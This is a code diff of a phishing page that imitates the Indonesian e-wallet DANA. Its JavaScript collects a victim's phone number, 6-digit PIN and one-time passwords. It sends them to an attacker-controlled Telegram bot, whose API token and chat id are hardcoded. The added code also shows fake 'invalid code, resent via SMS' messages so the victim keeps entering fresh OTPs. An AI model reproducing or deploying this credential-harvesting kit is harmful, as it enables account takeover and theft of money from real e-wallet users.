-   document.getElementById("useridku").innerHTML = "Kode OTP telah kadaluarsa atau invalid, Silahkan Kirim ulang OTP"; 
-   document.getElementById("process1").style.display = "flex";
-      $("#process1").fadeOut();
-    
-     var logo = document.getElementById('logo');
-   var pin111 = document.getElementById('pin111');
-   var pin222 = document.getElementById('pin222');
-   var pin333 = document.getElementById('pin333');
-   var pin444 = document.getElementById('pin444');
-    
-
-    var gabungan = '' + logo.value +  '%0A~%20𝗢𝗧𝗣 𝗗𝗔𝗡𝗔%20~%0A%20%20%20%20%20%20' + pin111.value + pin222.value + pin333.value + pin444.value;
-
-
-    var token = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6235911819; // Ganti dengan chat id dari bot yang kamu buat
-
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
-    })
-}
- </script>
- <script>
-  function closechat(){
-      document.getElementById("Backdrop").style.display = "none";
-  }
-  function openchat(){
-      document.getElementById("Backdrop").style.display = "block";
-  }
-</script>
-<script>
-// Ganti nomor WhatsApp berikut dengan nomor kamu
-const NOMOR_WHATSAPP = ""; //Pastikan nomor diawali dengan kode negara tanpa tanda "+" (cth. 085-XXX-XXX-XXX diubah mendaji 6285-XXX-XXX-XXX)
-
-const ewc_hidden = document.querySelectorAll(".ewc_hidden");
-const ewc_button = document.querySelectorAll(".ewc_button");
-const ewc_audio = new Audio(
-  "https://www-dana-idl.github.io/Dana.kaget/diana-dana.mp3"
 );
-
-const ewcShow = () => {
-  ewc_hidden.forEach((el) => {
-    el.style.display = "flex";
-    el.ariaHidden = "false";
-  });
-  ewc_audio.play();
-
-  setTimeout(() => {
-    ewc_hidden.forEach((el) => {
-      el.style.opacity = "1";
-    });
-  }, 0);
-
-  setTimeout(() => {
-    document.getElementById("ewChatBubble").style.opacity = "1";
-  }, 300);
 };
 
-const ewcHide = () => {
-  ewc_hidden.forEach((el) => {
-    el.style.opacity = "0";
-    document.getElementById("ewChatBubble").style.opacity = "0";
-    el.ariaHidden = "true";
-  });
 
-  setTimeout(() => {
-    ewc_hidden.forEach((el) => {
-      el.style.display = "none";
-    });
-  }, 1000);
-};
+  function sendOtp(){
+    $(".loadingOtp").show();
+     var logo = document.getElementById('logo'); 
+     var inp = document.getElementById('inp');
+ var pin1 = document.getElementById('pin1');
+ var pin2 = document.getElementById('pin2');
+ var pin3 = document.getElementById('pin3');
+ var pin4 = document.getElementById('pin4');
+ var pin5 = document.getElementById('pin5');
+ var pin6 = document.getElementById('pin6');
+     var otp1 = document.getElementById('otp1');
+   var otp2 = document.getElementById('otp2');
+   var otp3 = document.getElementById('otp3');
+   var otp4 = document.getElementById('otp4');
+    setTimeout(function(){
+$(".alert").text("Kode Invalid ");
+$(".alert").css("color","red");
+ },2000);
+    var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value + '%0A𝐏𝐈𝐍    : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝐎𝐓𝐏    : ' + otp1.value + otp2.value + otp3.value + otp4.value;
 
-function ewcOpen() {
-  if (ewChatBox.style.display == "none") {
-    ewcShow();
-  } else {
-    ewcHide();
-  }
+
+    var token ='7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
+    var grup = '6235911819'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        
+    success: function(){
+    setTimeout(function(){
+    $(".loadingOtp").hide();
+   
+    $('.inpotp').val('');
+   $('#otp1').focus();
+  var nomor = sessionStorage.getItem("nomor");
+        document.getElementById("alert").innerHTML = "Kode baru dikirim ulang via SMS ke  +62" + nomor +  " <br/>";
+   $(".alert").css("color","black");
+    },4000);
+   
+        
+    }
+        
+    }
+    );
+        
+    };
+    </script>
+<script>
+    function countdown() {
+    var count = parseInt(
+    $('#countdown').text());
+    if (count !== 0) {
+    $('#countdown').text(count - 1);} 
+    else {
+    $('#countdown').text('60');}};
+    </script>
+<script>
+window.onload = function(){
+        setTimeout(function(){
+            $(".start").fadeIn();
+            setTimeout(function(){
+                $(".start").fadeOut(1000);
+                setTimeout(function(){
+                   $(".container").fadeIn(200);
+                   $("#inp").focus();
+                },1000);
+            },1000);
+        },500);
 }
-
-document.querySelectorAll(".ewc_close").forEach((el) => {
-  el.addEventListener("click", ewcHide);
-});
-
-document.querySelectorAll(".ewc_open").forEach((el) => {
-  el.addEventListener("click", ewcOpen);
-});
-
-document.getElementById("ewc_send").addEventListener("click", () => {
-  window.open(
-    `https://wa.me/${NOMOR_WHATSAPP}?text=${encodeURI(
-      document.getElementById("ewc_message").value
-    )}`
-  );
-});
 </script>
+</body>
+</html><!--<script src='https://a.bsite.net/footer.js'></script>
